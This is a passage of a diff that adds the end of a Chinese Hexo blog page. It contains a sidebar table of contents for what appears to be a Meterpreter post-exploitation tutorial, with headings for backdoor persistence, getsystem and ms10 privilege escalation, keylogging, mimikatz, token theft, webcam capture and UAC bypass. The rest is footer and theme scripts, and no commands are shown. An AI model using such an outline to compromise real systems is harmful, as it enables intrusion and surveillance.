class="nav-link" href="#添加一条通向目标服务器内网的路由"><span class="nav-number">3.0.5.</span> <span class="nav-text">添加一条通向目标服务器内网的路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内网代理"><span class="nav-number">3.0.6.</span> <span class="nav-text">内网代理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统命令"><span class="nav-number">4.</span> <span class="nav-text">系统命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ps"><span class="nav-number">4.0.1.</span> <span class="nav-text">ps</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#migrate"><span class="nav-number">4.0.2.</span> <span class="nav-text">migrate</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#execute"><span class="nav-number">4.0.3.</span> <span class="nav-text">execute</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getpid"><span class="nav-number">4.0.4.</span> <span class="nav-text">getpid</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kill"><span class="nav-number">4.0.5.</span> <span class="nav-text">kill</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getuid"><span class="nav-number">4.0.6.</span> <span class="nav-text">getuid</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sysinfo"><span class="nav-number">4.0.7.</span> <span class="nav-text">sysinfo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shutdown"><span class="nav-number">4.0.8.</span> <span class="nav-text">shutdown</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#植入后门"><span class="nav-number">5.</span> <span class="nav-text">植入后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#persistence"><span class="nav-number">5.0.1.</span> <span class="nav-text">persistence</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#metsvc"><span class="nav-number">5.0.2.</span> <span class="nav-text">metsvc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getgui"><span class="nav-number">5.0.3.</span> <span class="nav-text">getgui</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提升权限"><span class="nav-number">6.</span> <span class="nav-text">提升权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getsystem-命令"><span class="nav-number">6.0.1.</span> <span class="nav-text">getsystem 命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms10-073-ms10-092"><span class="nav-number">6.0.2.</span> <span class="nav-text">ms10-073\ms10-092</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#键盘监听"><span class="nav-number">7.</span> <span class="nav-text">键盘监听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz"><span class="nav-number">8.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络嗅探"><span class="nav-number">9.</span> <span class="nav-text">网络嗅探</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#捕捉屏幕"><span class="nav-number">10.</span> <span class="nav-text">捕捉屏幕</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#盗取令牌"><span class="nav-number">11.</span> <span class="nav-text">盗取令牌</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络摄像头"><span class="nav-number">12.</span> <span class="nav-text">网络摄像头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网扫描"><span class="nav-number">13.</span> <span class="nav-text">内网扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描"><span class="nav-number">13.0.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#存活主机扫描"><span class="nav-number">13.0.2.</span> <span class="nav-text">存活主机扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过UAC"><span class="nav-number">14.</span> <span class="nav-text">绕过UAC</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tusk1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
